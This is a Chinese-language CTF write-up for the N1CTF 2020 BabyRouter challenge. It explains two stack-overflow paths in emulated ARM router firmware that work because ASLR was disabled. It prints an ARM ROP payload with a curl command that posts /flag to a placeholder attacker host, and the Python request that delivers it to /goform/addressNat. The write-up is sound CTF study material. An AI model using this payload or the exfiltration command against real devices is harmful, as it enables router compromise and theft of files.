# N1CTF 2020 BabyRouter Writeup

## 题目简述

题目把 ARM 路由器固件服务放在 qemu-user 环境中。公开可复现的解法有两条：一条利用 `POST /goform/addressNat` 中多个参数进入 `sprintf` 造成栈溢出；另一条利用 MAC 过滤配置接口的长 `deviceList` 覆盖返回地址。赛时 qemu-user 意外关闭 ASLR，使硬编码栈地址与 libc 地址可用。出题人原计划使用私有漏洞在开启 ASLR 时完成利用，但相关细节没有公开，因此本文只记录有证据、可复现的赛时路径。

## 解题过程

### 确认认证和溢出入口

路由 Web 服务以 Cookie 保存管理密码。不同公开脚本针对的接口不同：

```text
/goform/addressNat      Cookie: password=swingss
/goform/setMacFilterCfg Cookie: password=12345
```

在 `addressNat` 处理函数中，`entrys`、`mitInterface` 和 `page` 被送入固定大小栈缓冲区的 `sprintf`。`page` 最适合作为长载荷。虽然输入会被 NUL 截断，但 qemu-user 下每次请求的栈布局基本不变，可以使用固定栈地址。

### 构造 ARM ROP

载荷前部保存命令字符串，后部恢复 `r4`、`r11` 和 `pc`。公开利用选择一段会从 `r11` 相对位置取参数并调用 `doShell` 的代码：

```python
cmd = b';curl -F flag=@/flag http://ATTACKER:PORT/;'
stack = 0xf6fff9ec

rop  = p32(stack) + cmd
rop  = rop.ljust(240, b'A')
rop += p32(stack)       # r4
rop += p32(stack + 16)  # r11
rop += p32(0x6b154)     # pc: load arguments; call doShell
```

然后发送：

```python
requests.post(
    target + '/goform/addressNat',
    data={'entrys': 'swings', 'mitInterface': 'swings', 'page': rop},
    cookies={'password': 'swingss'},
)
```

另一条赛时路径在 `setMacFilterCfg` 的 `deviceList` 中使用约 176 字节填充，再以固定 libc 基址拼出 `system`/netcat ROP。两者能成功的共同前提都是意外关闭的地址随机化；偏移和绝对地址只对附件固件及赛时 qemu 环境成立。

### 说明预期解缺口

官方材料明确提到，预期环境应开启 ASLR，并计划通过一个可重复触发、能绕过 NUL 限制的私有 0day 逐步取得控制。仓库未给出该漏洞源码或解题脚本，公开资料也不足以还原，所以不能把赛时硬编码地址的 exploit 描述成预期解。

## 方法总结

仿真题必须把固件漏洞和仿真环境缺陷分开验证。栈地址固定、NX 或 ASLR 状态异常，往往来自 qemu 启动参数而非目标设备本身。写 WP 时应明确标注预期链与非预期链；缺少私有漏洞细节时，保留已验证的公开路径比补写未经证实的利用过程更可靠。
